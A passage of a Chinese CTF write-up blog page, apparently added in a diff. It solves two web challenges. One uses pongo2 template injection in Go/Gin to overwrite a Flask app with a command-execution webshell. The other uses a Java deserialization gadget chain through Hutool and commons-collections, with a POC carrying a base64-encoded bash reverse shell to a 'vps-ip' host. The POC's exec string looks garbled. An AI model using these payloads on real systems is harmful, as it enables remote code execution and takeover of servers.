+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">func</span> <span style="color:#a6e22e">Flask</span>(<span style="color:#a6e22e">c</span> <span style="color:#f92672">*</span><span style="color:#a6e22e">gin</span>.<span style="color:#a6e22e">Context</span>) {  <span style="color:#75715e">// 获取会话，然后判断name字段是否为空，不为空则获取url中name字段的值，并将其与本地地址拼接，发送一个GET请求
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#a6e22e">session</span>, <span style="color:#a6e22e">err</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">store</span>.<span style="color:#a6e22e">Get</span>(<span style="color:#a6e22e">c</span>.<span style="color:#a6e22e">Request</span>, <span style="color:#e6db74">&#34;session-name&#34;</span>)
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> <span style="color:#a6e22e">err</span> <span style="color:#f92672">!=</span> <span style="color:#66d9ef">nil</span> {
+</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">http</span>.<span style="color:#a6e22e">Error</span>(<span style="color:#a6e22e">c</span>.<span style="color:#a6e22e">Writer</span>, <span style="color:#a6e22e">err</span>.<span style="color:#a6e22e">Error</span>(), <span style="color:#a6e22e">http</span>.<span style="color:#a6e22e">StatusInternalServerError</span>)
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">return</span>
+</span></span><span style="display:flex;"><span>	}
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> <span style="color:#a6e22e">session</span>.<span style="color:#a6e22e">Values</span>[<span style="color:#e6db74">&#34;name&#34;</span>] <span style="color:#f92672">==</span> <span style="color:#66d9ef">nil</span> {
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">if</span> <span style="color:#a6e22e">err</span> <span style="color:#f92672">!=</span> <span style="color:#66d9ef">nil</span> {
+</span></span><span style="display:flex;"><span>			<span style="color:#a6e22e">http</span>.<span style="color:#a6e22e">Error</span>(<span style="color:#a6e22e">c</span>.<span style="color:#a6e22e">Writer</span>, <span style="color:#e6db74">&#34;N0&#34;</span>, <span style="color:#a6e22e">http</span>.<span style="color:#a6e22e">StatusInternalServerError</span>)
+</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">return</span>
+</span></span><span style="display:flex;"><span>		}
+</span></span><span style="display:flex;"><span>	}
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">resp</span>, <span style="color:#a6e22e">err</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">http</span>.<span style="color:#a6e22e">Get</span>(<span style="color:#e6db74">&#34;http://127.0.0.1:5000/&#34;</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">c</span>.<span style="color:#a6e22e">DefaultQuery</span>(<span style="color:#e6db74">&#34;name&#34;</span>, <span style="color:#e6db74">&#34;guest&#34;</span>))
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> <span style="color:#a6e22e">err</span> <span style="color:#f92672">!=</span> <span style="color:#66d9ef">nil</span> {
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">return</span>
+</span></span><span style="display:flex;"><span>	}
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">defer</span> <span style="color:#a6e22e">resp</span>.<span style="color:#a6e22e">Body</span>.<span style="color:#a6e22e">Close</span>()
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">body</span>, <span style="color:#a6e22e">_</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">io</span>.<span style="color:#a6e22e">ReadAll</span>(<span style="color:#a6e22e">resp</span>.<span style="color:#a6e22e">Body</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">c</span>.<span style="color:#a6e22e">String</span>(<span style="color:#ae81ff">200</span>, string(<span style="color:#a6e22e">body</span>))
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><h4 id="复现过程">复现过程</h4>
+<p><strong>伪造session</strong></p>
+<p>修改<code>session.Values[&quot;name&quot;] = &quot;admin&quot;</code></p>
+<pre tabindex="0"><code>go run main.go
+</code></pre><p><img src="https://cdn.jsdelivr.net/gh/n2ryx/Picture-bed@master/typora/image-20240327192605632.png" alt="image-20240327192605632"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/n2ryx/Picture-bed@master/typora/image-20240327200832964.png" alt="image-20240327200832964"></p>
+<p><strong>pongo2模板注入</strong></p>
+<p>/flask?name=/，引发报错拿到flask源码</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> flask <span style="color:#f92672">import</span> Flask,request
+</span></span><span style="display:flex;"><span>app <span style="color:#f92672">=</span> Flask(__name__)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">@app.route</span>(<span style="color:#e6db74">&#39;/&#39;</span>)
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">index</span>():
+</span></span><span style="display:flex;"><span>    name <span style="color:#f92672">=</span> request<span style="color:#f92672">.</span>args[<span style="color:#e6db74">&#39;name&#39;</span>]
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> name <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;no ssti&#39;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> __name__<span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;__main__&#34;</span>:
+</span></span><span style="display:flex;"><span>    app<span style="color:#f92672">.</span>run(host<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;127.0.0.1&#34;</span>,port<span style="color:#f92672">=</span><span style="color:#ae81ff">5000</span>,debug<span style="color:#f92672">=</span><span style="color:#66d9ef">True</span>)
+</span></span></code></pre></div><p>这个程序设置了debug=True，说明程序开启了热加载功能，代码在更改后会自动重新加载程序，这意味着我们对代码进行更改后就会立即生效，debug模式下的热加载替换flask源码实现RCE，要用到SaveUploadedFile方法实现任意文件写<code>{{c.SaveUploadedFile(c.FormFile(&quot;file&quot;),&quot;/app/server.py&quot;)}}</code></p>
+<blockquote>
+<p>但这里要注意参数经过 html.EscapeString(name) 转义，会将双引号转义掉，所以要换一种方式，对于&quot;file&quot;，gin.Context还提供了另一种方法，HandlerName() 方法，用于返回主处理程序的名称，这里返回的就是admin/route.Admin，然后可以用过滤器last获取最后一个字符串。对于 “/app/server.py”，可以在请求头中将Referer字段设置成 “/app/server.py”，然后用 Request.Referer()方法获取Referer的值。（还有其他方法，如Request.Host()、Request.UA()等）</p>
+<p>因为要从Referer头中获取源码路径，故添加Referer: /app/server.py，且上传文件提交表单需要Content-Type 请求，同时需要边界字符串分割（可自定义），故添加Content-Type: multipart/form-data; boundary=&mdash;-WebKitFormBoundary8ALIn5Z2C3VlBqND</p>
+</blockquote>
+<pre tabindex="0"><code>GET /admin?name={{c.SaveUploadedFile(c.FormFile(c.HandlerName()|last),c.Request.Referer())}} HTTP/1.1
+Host: 859997a4-b46a-4a5c-b034-448e90505aa5.challenge.ctf.show
+Cache-Control: max-age=0
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Accept-Encoding: gzip, deflate
+Accept-Language: zh-CN,zh;q=0.9
+Referer: /app/server.py
+Content-Type: multipart/form-data; boundary=----WebKitFormBoundary8ALIn5Z2C3VlBqND
+Cookie: session-name=MTcxMTUzODU2MXxEWDhFQVFMX2dBQUJFQUVRQUFBal80QUFBUVp6ZEhKcGJtY01CZ0FFYm1GdFpRWnpkSEpwYm1jTUJ3QUZZV1J0YVc0PXyB-2MEmWBEhT2LmkrXFrKm9hHzDFKVLoIWHcrKauUlWQ==
+Connection: close
+Content-Length: 429
+
+------WebKitFormBoundary8ALIn5Z2C3VlBqND
+Content-Disposition: form-data; name=&#34;n&#34;; filename=&#34;1.py&#34;
+Content-Type: text/plain
+
+from flask import *
+import os
+app = Flask(__name__)
+
+
+@app.route(&#39;/&#39;)
+def index():
+    name = request.args[&#39;name&#39;]
+    file=os.popen(name).read()
+    return file
+
+
+if __name__ == &#34;__main__&#34;:
+    app.run(host=&#34;0.0.0.0&#34;, port=5000, debug=True)
+------WebKitFormBoundary8ALIn5Z2C3VlBqND--
+</code></pre><p><img src="C:/Users/Night/AppData/Roaming/Typora/typora-user-images/image-20240327194437758.png" alt="image-20240327194437758"></p>
+<p>Fianl，/flask?name=?name=env</p>
+<h3 id="deserbug">deserbug</h3>
+<p>题型：Java反序列化</p>
+<p>附件中可以看到两个依赖，分别是<code>common-colletions-3.2.2</code>和<code>hutool-all-5.8.18</code></p>
+<p><code>CC3.2.2</code>，比<code>CC3.1.1</code>多了一个<code>checkUnsafeSerialization</code>函数，对序列化的类进行了检查，禁止一些类的序列化：</p>
+<pre tabindex="0"><code>WhileClosure
+CloneTransformer
+ForClosure
+InstantiateFactory
+InstantiateTransformer
+InvokerTransformer
+PrototypeCloneFactory
+PrototypeSerializationFactory
+</code></pre><p>源码，MyExpect类，Testapp类</p>
+<p>MyExpect.java</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#f92672">package</span> com.app;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> java.lang.reflect.Constructor;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">public</span> <span style="color:#66d9ef">class</span> <span style="color:#a6e22e">Myexpect</span> <span style="color:#66d9ef">extends</span> Exception {
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">private</span> Class<span style="color:#f92672">[]</span> typeparam;
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">private</span> Object<span style="color:#f92672">[]</span> typearg;
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">private</span> Class targetclass;
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">public</span> String name;
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">public</span> String anyexcept;
+</span></span><span style="display:flex;"><span>  
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">public</span> Class <span style="color:#a6e22e">getTargetclass</span>() {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">targetclass</span>;
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">setTargetclass</span>(Class targetclass) {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">targetclass</span> <span style="color:#f92672">=</span> targetclass;
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">public</span> Object<span style="color:#f92672">[]</span> <span style="color:#a6e22e">getTypearg</span>() {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">typearg</span>;
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">setTypearg</span>(Object<span style="color:#f92672">[]</span> typearg) {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">typearg</span> <span style="color:#f92672">=</span> typearg;
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">public</span> Object <span style="color:#a6e22e">getAnyexcept</span>() <span style="color:#66d9ef">throws</span> Exception {
+</span></span><span style="display:flex;"><span>    Constructor con <span style="color:#f92672">=</span> <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">targetclass</span>.<span style="color:#a6e22e">getConstructor</span>(<span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">typeparam</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> con.<span style="color:#a6e22e">newInstance</span>(<span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">typearg</span>);
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">setAnyexcept</span>(String anyexcept) {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">anyexcept</span> <span style="color:#f92672">=</span> anyexcept;
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">public</span> Class<span style="color:#f92672">[]</span> <span style="color:#a6e22e">getTypeparam</span>() {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">typeparam</span>;
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">setTypeparam</span>(Class<span style="color:#f92672">[]</span> typeparam) {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">typeparam</span> <span style="color:#f92672">=</span> typeparam;
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">public</span> String <span style="color:#a6e22e">getName</span>() {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">name</span>;
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">setName</span>(String name) {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">name</span> <span style="color:#f92672">=</span> name;
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>Testapp.java</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#f92672">package</span> com.app;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> cn.hutool.http.ContentType;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> cn.hutool.http.HttpUtil;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> cn.hutool.http.server.HttpServerRequest;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> cn.hutool.http.server.HttpServerResponse;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> java.io.ByteArrayInputStream;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> java.io.IOException;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> java.io.ObjectInputStream;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> java.util.Base64;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">public</span> <span style="color:#66d9ef">class</span> <span style="color:#a6e22e">Testapp</span> {
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">main</span>(String<span style="color:#f92672">[]</span> args) {
+</span></span><span style="display:flex;"><span>    HttpUtil.<span style="color:#a6e22e">createServer</span>(8888)
+</span></span><span style="display:flex;"><span>      .<span style="color:#a6e22e">addAction</span>(<span style="color:#e6db74">&#34;/&#34;</span>, (request, response) <span style="color:#f92672">-&gt;</span> {
+</span></span><span style="display:flex;"><span>          String bugstr <span style="color:#f92672">=</span> request.<span style="color:#a6e22e">getParam</span>(<span style="color:#e6db74">&#34;bugstr&#34;</span>);
+</span></span><span style="display:flex;"><span>          String result <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span>;
+</span></span><span style="display:flex;"><span>          <span style="color:#66d9ef">if</span> (bugstr <span style="color:#f92672">==</span> <span style="color:#66d9ef">null</span>)
+</span></span><span style="display:flex;"><span>            response.<span style="color:#a6e22e">write</span>(<span style="color:#e6db74">&#34;welcome,plz give me bugstr&#34;</span>, ContentType.<span style="color:#a6e22e">TEXT_PLAIN</span>.<span style="color:#a6e22e">toString</span>()); 
+</span></span><span style="display:flex;"><span>          <span style="color:#66d9ef">try</span> {	<span style="color:#75715e">// base64解码转化为对象流后直接进行了readObject</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">byte</span><span style="color:#f92672">[]</span> decode <span style="color:#f92672">=</span> Base64.<span style="color:#a6e22e">getDecoder</span>().<span style="color:#a6e22e">decode</span>(bugstr);
+</span></span><span style="display:flex;"><span>            ObjectInputStream inputStream <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> ObjectInputStream(<span style="color:#66d9ef">new</span> ByteArrayInputStream(decode));
+</span></span><span style="display:flex;"><span>            Object object <span style="color:#f92672">=</span> inputStream.<span style="color:#a6e22e">readObject</span>();
+</span></span><span style="display:flex;"><span>            result <span style="color:#f92672">=</span> object.<span style="color:#a6e22e">toString</span>();
+</span></span><span style="display:flex;"><span>          } <span style="color:#66d9ef">catch</span> (Exception e) {
+</span></span><span style="display:flex;"><span>            Myexpect myexpect <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> Myexpect();
+</span></span><span style="display:flex;"><span>            myexpect.<span style="color:#a6e22e">setTypeparam</span>(<span style="color:#66d9ef">new</span> Class<span style="color:#f92672">[]</span> { String.<span style="color:#a6e22e">class</span> });
+</span></span><span style="display:flex;"><span>            myexpect.<span style="color:#a6e22e">setTypearg</span>((Object<span style="color:#f92672">[]</span>)<span style="color:#66d9ef">new</span> String<span style="color:#f92672">[]</span> { e.<span style="color:#a6e22e">toString</span>() });
+</span></span><span style="display:flex;"><span>            myexpect.<span style="color:#a6e22e">setTargetclass</span>(e.<span style="color:#a6e22e">getClass</span>());
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">try</span> {
+</span></span><span style="display:flex;"><span>              result <span style="color:#f92672">=</span> myexpect.<span style="color:#a6e22e">getAnyexcept</span>().<span style="color:#a6e22e">toString</span>();
+</span></span><span style="display:flex;"><span>            } <span style="color:#66d9ef">catch</span> (Exception ex) {
+</span></span><span style="display:flex;"><span>              result <span style="color:#f92672">=</span> ex.<span style="color:#a6e22e">toString</span>();
+</span></span><span style="display:flex;"><span>            } 
+</span></span><span style="display:flex;"><span>          } 
+</span></span><span style="display:flex;"><span>          response.<span style="color:#a6e22e">write</span>(result, ContentType.<span style="color:#a6e22e">TEXT_PLAIN</span>.<span style="color:#a6e22e">toString</span>());
+</span></span><span style="display:flex;"><span>        }).<span style="color:#a6e22e">start</span>();
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>提示：<code>cn.hutool.json.JSONObject.put-&gt;com.app.Myexpect#getAnyexcept</code></p>
+<p>通过<code>hutools.put</code>返回能够触发<code>getAnyexcept</code>，通过这里就可以串起<code>CC3</code>链子，<code>getAnyexcept</code>实例化<code>TrAXFilter</code>，接而触发<code>templates</code>加载字节码触发RCE</p>
+<pre tabindex="0"><code>HashMap#readObject()-&gt;HashMap#hash()-&gt;TiedMapEntry#hashCode()-&gt;TiedMapEntry#getValue()-&gt;LazyMap#get()-&gt;cn.hutool.json.JSONObject.put()-&gt;Myexpect#getAnyexcept()-&gt;TrAXFilter#constructor()-&gt;TemplatesImpl#newTransformer()-&gt;Runtime.exec()
+</code></pre><p>POC</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#f92672">package</span> com.app;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> cn.hutool.json.JSONObject;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> javassist.ClassPool;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> javassist.CtClass;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> org.apache.commons.collections.functors.ConstantTransformer;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> org.apache.commons.collections.map.LazyMap;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> javax.xml.transform.Templates;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> java.io.*;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> java.util.Base64;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> java.util.HashMap;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> java.lang.reflect.Field;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">public</span> <span style="color:#66d9ef">class</span> <span style="color:#a6e22e">POC</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">main</span>(String<span style="color:#f92672">[]</span> args) <span style="color:#66d9ef">throws</span> Exception {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">byte</span><span style="color:#f92672">[]</span> bytes <span style="color:#f92672">=</span> getTemplates();
+</span></span><span style="display:flex;"><span>        TemplatesImpl templates <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> TemplatesImpl();
+</span></span><span style="display:flex;"><span>        setFieldValue(templates, <span style="color:#e6db74">&#34;_name&#34;</span>, <span style="color:#e6db74">&#34;2&#34;</span>);
+</span></span><span style="display:flex;"><span>        setFieldValue(templates, <span style="color:#e6db74">&#34;_class&#34;</span>, <span style="color:#66d9ef">null</span>);
+</span></span><span style="display:flex;"><span>        setFieldValue(templates, <span style="color:#e6db74">&#34;_bytecodes&#34;</span>, <span style="color:#66d9ef">new</span> <span style="color:#66d9ef">byte</span><span style="color:#f92672">[][]</span>{bytes});
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        Myexpect myexpect <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> Myexpect();
+</span></span><span style="display:flex;"><span>        myexpect.<span style="color:#a6e22e">setTargetclass</span>(TrAXFilter.<span style="color:#a6e22e">class</span>);
+</span></span><span style="display:flex;"><span>        myexpect.<span style="color:#a6e22e">setTypeparam</span>(<span style="color:#66d9ef">new</span> Class<span style="color:#f92672">[]</span>{Templates.<span style="color:#a6e22e">class</span>});
+</span></span><span style="display:flex;"><span>        myexpect.<span style="color:#a6e22e">setTypearg</span>(<span style="color:#66d9ef">new</span> Object<span style="color:#f92672">[]</span>{templates});
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        JSONObject jsonObject <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> JSONObject();
+</span></span><span style="display:flex;"><span>        ConstantTransformer transformer <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> ConstantTransformer(1);
+</span></span><span style="display:flex;"><span>        LazyMap lazyMap  <span style="color:#f92672">=</span> (LazyMap) LazyMap.<span style="color:#a6e22e">decorate</span>(jsonObject, transformer);
+</span></span><span style="display:flex;"><span>        TiedMapEntry tiedMapEntry <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> TiedMapEntry(lazyMap , <span style="color:#e6db74">&#34;111&#34;</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        HashMap hashMap <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> HashMap();
+</span></span><span style="display:flex;"><span>        hashMap.<span style="color:#a6e22e">put</span>(tiedMapEntry, <span style="color:#e6db74">&#34;2&#34;</span>);
+</span></span><span style="display:flex;"><span>        jsonObject.<span style="color:#a6e22e">remove</span>(<span style="color:#e6db74">&#34;111&#34;</span>);
+</span></span><span style="display:flex;"><span>        setFieldValue(transformer, <span style="color:#e6db74">&#34;iConstant&#34;</span>, myexpect);
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">byte</span><span style="color:#f92672">[]</span> serbyte <span style="color:#f92672">=</span>serialize(hashMap);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        System.<span style="color:#a6e22e">out</span>.<span style="color:#a6e22e">println</span>(Base64.<span style="color:#a6e22e">getEncoder</span>().<span style="color:#a6e22e">encodeToString</span>(serbyte));
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">static</span>  <span style="color:#66d9ef">byte</span><span style="color:#f92672">[]</span> <span style="color:#a6e22e">serialize</span>(Object object) <span style="color:#66d9ef">throws</span> IOException {
+</span></span><span style="display:flex;"><span>        ByteArrayOutputStream byteArrayOutputStream<span style="color:#f92672">=</span><span style="color:#66d9ef">new</span> ByteArrayOutputStream();
+</span></span><span style="display:flex;"><span>        ObjectOutputStream objectOutputStream <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> ObjectOutputStream(byteArrayOutputStream);
+</span></span><span style="display:flex;"><span>        objectOutputStream.<span style="color:#a6e22e">writeObject</span>(object);
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> byteArrayOutputStream.<span style="color:#a6e22e">toByteArray</span>();
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">setFieldValue</span>(Object obj, String field, Object val) <span style="color:#66d9ef">throws</span> Exception{
+</span></span><span style="display:flex;"><span>        Field dField <span style="color:#f92672">=</span> obj.<span style="color:#a6e22e">getClass</span>().<span style="color:#a6e22e">getDeclaredField</span>(field);
+</span></span><span style="display:flex;"><span>        dField.<span style="color:#a6e22e">setAccessible</span>(<span style="color:#66d9ef">true</span>);
+</span></span><span style="display:flex;"><span>        dField.<span style="color:#a6e22e">set</span>(obj, val);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">byte</span><span style="color:#f92672">[]</span> <span style="color:#a6e22e">getTemplates</span>() <span style="color:#66d9ef">throws</span> Exception{
+</span></span><span style="display:flex;"><span>        ClassPool pool <span style="color:#f92672">=</span> ClassPool.<span style="color:#a6e22e">getDefault</span>();
+</span></span><span style="display:flex;"><span>        CtClass template <span style="color:#f92672">=</span> pool.<span style="color:#a6e22e">makeClass</span>(<span style="color:#e6db74">&#34;Chiikawa&#34;</span>);
+</span></span><span style="display:flex;"><span>        template.<span style="color:#a6e22e">setSuperclass</span>(pool.<span style="color:#a6e22e">get</span>(<span style="color:#e6db74">&#34;com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet&#34;</span>));
+</span></span><span style="display:flex;"><span>        String block <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;Runtime.getRuntime().exec(\&#34;Runtime.getRuntime().exec(\&#34;bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC92cHMtaXAvNjY2NiAwPiYgMQ==}|{base64,-d}|{bash,-i})\&#34;)&#34;</span>;
+</span></span><span style="display:flex;"><span>        template.<span style="color:#a6e22e">makeClassInitializer</span>().<span style="color:#a6e22e">insertBefore</span>(block);
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> template.<span style="color:#a6e22e">toBytecode</span>();
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>URL编码下</p>
+<p><img src="https://cdn.jsdelivr.net/gh/n2ryx/Picture-bed@master/typora/image-20240328093825290.png" alt="image-20240328093825290"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/n2ryx/Picture-bed@master/typora/image-20240328093707725.png" alt="image-20240328093707725"></p>
+
+</div>
+
+  
+<footer class='entry-footer'>
+  <div class='container sep-before'><div class='tags'><svg
+  class="icon"
+  xmlns="http://www.w3.org/2000/svg"
+  viewbox="0 0 24 24"
+  stroke-linecap="round"
+  stroke-linejoin="round"
+  stroke-width="2"
+  aria-hidden="true"
+><path d="M20.59,13.41l-7.17,7.17a2,2,0,0,1-2.83,0L2,12V2H12l8.59,8.59A2,2,0,0,1,20.59,13.41Z" />
+<line x1="7" y1="7" x2="7" y2="7" />
+</svg>
+<span class='screen-reader-text'>Tags: </span><a class='tag' href='/tags/ctf/'>CTF</a></div>
+
+  </div>
+</footer>
+
+
+</article>
+
+<nav class='entry-nav'>
+  <div class='container'><div class='prev-entry sep-before'>
